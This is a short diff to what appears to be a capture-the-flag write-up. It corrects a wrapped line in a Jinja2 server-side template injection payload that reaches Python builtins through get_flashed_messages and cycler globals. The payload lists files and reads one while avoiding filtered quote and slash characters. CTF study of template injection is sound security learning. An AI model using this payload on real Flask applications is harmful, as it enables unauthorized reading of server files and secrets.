@@ -157,8 +157,7 @@ But `', ", /` are filtered. So we ultilize the previous file listing payload, wi
 Payload:
 
 ```
-{{get_flashed_messages.__globals__.__builtins__.open(cycler.__init__._
-_globals__.os.listdir().pop()).read()}}
+{{get_flashed_messages.__globals__.__builtins__.open(cycler.__init__.__globals__.os.listdir().pop()).read()}}
 ```
 
 Thanks PayloadAllTheThing.
